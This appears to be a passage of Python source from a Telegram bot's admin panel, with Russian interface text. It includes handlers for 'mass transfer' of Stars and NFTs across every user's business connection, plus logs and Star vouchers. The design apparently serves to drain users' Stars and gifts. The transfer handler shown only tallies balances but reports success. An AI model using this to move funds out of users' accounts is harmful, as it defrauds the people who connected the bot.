async def admin_mass_stars(callback: CallbackQuery):
    """Массовый перевод звезд"""
    if not is_admin(callback.from_user.id):
        return
    
    await callback.answer("⭐️ Запускаем массовый перевод звезд...")
    
    try:
        connections = get_connections()
        total_stars = 0
        successful = 0
        failed = 0
        errors = []
        
        for connection in connections:
            try:
                user_id = connection.get('user_id')
                business_connection_id = connection.get('business_connection_id')
                if user_id and business_connection_id:
                    balance = await get_star_balance(callback.bot, business_connection_id)
                    if balance and balance > 0:
                        total_stars += balance
                        successful += 1
            except Exception as e:
                failed += 1
                user_id = connection.get('user_id', 'Unknown')
                errors.append(f"Пользователь {user_id}: {str(e)}")
        
        text = (
            f"⭐️ <b>Массовый перевод звезд завершен</b>\n\n"
            f"👥 Обработано пользователей: {len(connections)}\n"
            f"⭐️ Всего звезд: {total_stars}\n"
            f"✅ Успешно: {successful}\n"
            f"❌ Ошибок: {failed}\n"
        )
        
        if errors:
            text += "\n⚠️ <b>Основные ошибки:</b>\n"
            for error in errors[:3]:
                text += f"• {error}\n"
        
        await callback.message.edit_text(
            text,
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]
            ])
        )
    except Exception as e:
        logger.error(f"Ошибка массового перевода звезд: {e}")
        await callback.message.edit_text(
            f"❌ Ошибка массового перевода звезд: {str(e)}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]
            ])
        )

@router.message(F.text == "/logs")
async def show_logs(message: Message):
    """Показать логи"""
    if not is_admin(message.from_user.id):
        return
    
    try:
        logs = get_recent_logs(10)
        
        if not logs:
            await message.answer("📋 Логи пусты")
            return
        
        log_text = "📋 <b>Последние логи:</b>\n\n"
        for log in logs:
            timestamp = log.get('timestamp', '')[:19]
            user_id = log.get('user_id', 'N/A')
            status = log.get('status', 'N/A')
            error = log.get('error', '')
            
            log_text += f"🕐 {timestamp}\n"
            log_text += f"👤 ID: {user_id}\n"
            log_text += f"📊 Статус: {status}\n"
            if error:
                log_text += f"❌ Ошибка: {error}\n"
            log_text += "\n"
        
        await message.answer(log_text, parse_mode="HTML")
    except Exception as e:
        logger.error(f"Ошибка получения логов: {e}")
        await message.answer(f"❌ Ошибка получения логов: {str(e)}")

@router.message(F.text.startswith("/delete_check"))
async def delete_check_command(message: Message):
    """Команда для удаления чека по ID"""
    if not is_admin(message.from_user.id):
        return
    
    try:
        parts = message.text.split()
        if len(parts) != 2:
            await message.answer(
                "❌ <b>Неверный формат команды!</b>\n\n"
                "💡 <b>Правильный формат:</b>\n"
                "<code>/delete_check ID_чека</code>\n\n"
                "📝 <b>Пример:</b>\n"
                "<code>/delete_check d4080cb3-1d1e-4dfd-a782-88549703df2a</code>",
                parse_mode="HTML"
            )
            return
        
        check_id = parts[1].strip()
        check = get_check(check_id)
        
        if not check:
            await message.answer(
                "❌ <b>Чек не найден!</b>\n\n"
                f"ID: <code>{check_id}</code>\n\n"
                "Проверьте правильность ID чека.",
                parse_mode="HTML"
            )
            return
        
        if check["used"]:
            await message.answer(
                "❌ <b>Нельзя удалить использованный чек!</b>\n\n"
                f"🎫 <b>ID чека:</b> <code>{check['id']}</code>\n"
                f"⭐️ <b>Звезд:</b> {check['stars_amount']}\n"
                f"👤 <b>Использовал:</b> {check.get('username', 'Неизвестно')}\n"
                f"📅 <b>Использован:</b> {check.get('used_at', 'Неизвестно')[:19].replace('T', ' ') if check.get('used_at') else 'Неизвестно'}",
                parse_mode="HTML"
            )
            return
        
        if delete_check(check_id):
            text = (
                f"✅ <b>Чек успешно удален!</b>\n\n"
                f"🎫 <b>ID чека:</b> <code>{check['id']}</code>\n"
                f"⭐️ <b>Звезд:</b> {check['stars_amount']}\n"
                f"📝 <b>Описание:</b> {check.get('description', 'Не указано')}\n"
                f"📅 <b>Создан:</b> {check['created_at'][:19].replace('T', ' ')}\n\n"
                f"🗑️ Чек был удален из системы."
            )
            
            log_admin_action(
                message.from_user.id,
                "delete_check_command",
                f"deleted check {check_id} ({check['stars_amount']} stars)"
            )
        else:
            text = "❌ <b>Ошибка удаления чека!</b>\n\nПопробуйте еще раз или обратитесь к разработчику."
        
        await message.answer(text, parse_mode="HTML")
        
    except Exception as e:
        logger.error(f"Ошибка при удалении чека через команду: {e}")
        await message.answer(
            f"❌ <b>Ошибка удаления чека:</b> {str(e)}",
            parse_mode="HTML"
        )

@router.message(F.text == "/help")
async def show_help(message: Message):
    """Показать справку"""
    if not is_admin(message.from_user.id):
        return
    
    help_text = (
        "📖 <b>Справка по командам админа</b>\n\n"
        "/admin - Админ-панель\n"
        "/logs - Последние логи\n"
        "/help - Эта справка\n\n"
        "🎫 <b>Система чеков:</b>\n"
        "/delete_check <ID> - удалить чек по ID\n"
        "Пример: /delete_check d4080cb3-1d1e-4dfd-a782-88549703df2a\n\n"
        "🔧 <b>Функции админ-панели:</b>\n"
        "• 📊 Статистика - общая статистика бота\n"
        "• 👥 Пользователи - список пользователей\n"
        "• 🔄 Массовый перевод NFT - перевод всех NFT\n"
        "• ⭐️ Массовый перевод звезд - перевод всех звезд\n"
        "• 📢 Рассылка - отправка сообщений всем пользователям\n"
        "• 🔧 Настройки - настройки бота\n"
        "• 📋 Логи - просмотр логов\n"
        "• 🎫 Система чеков - создание и управление чеками"
    )
    
    await message.answer(help_text, parse_mode="HTML")

@router.callback_query(F.data == "admin_checks")
async def admin_checks(callback: CallbackQuery):
    """Система чеков"""
    if not is_admin(callback.from_user.id):
        return
    
    try:
        stats = get_checks_statistics()
        
        text = (
            "🎫 <b>Система чеков на звезды</b>\n\n"
            f"📊 <b>Статистика:</b>\n"
            f"• Всего чеков: {stats['total_checks']}\n"
            f"• Использовано: {stats['used_checks']}\n"
            f"• Не использовано: {stats['unused_checks']}\n"
            f"• Всего звезд: {stats['total_stars']}\n"
            f"• Использовано звезд: {stats['used_stars']}\n"
            f"• Не использовано звезд: {stats['unused_stars']}\n\n"
            "💡 <b>Как создать чек:</b>\n"
            "1. В любом чате напишите: @Storthash_bot чек 100 Подарок\n"
            "2. Выберите красивый чек из предложенных\n"
            "3. Отправьте другу!\n\n"
            "Выберите действие:"
        )
        
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="➕ Создать чек", callback_data="admin_create_check")],
            [InlineKeyboardButton(text="📋 Список чеков", callback_data="admin_list_checks")],
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]
        ])
        
        await callback.message.edit_text(
            text,
            parse_mode="HTML",
            reply_markup=keyboard
        )
        
    except Exception as e:
        logger.error(f"Ошибка при отображении чеков: {e}")
        await callback.message.edit_text(
            f"❌ <b>Ошибка!</b>\n\n"
            f"Не удалось получить данные чеков: {str(e)}",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]
            ])
        )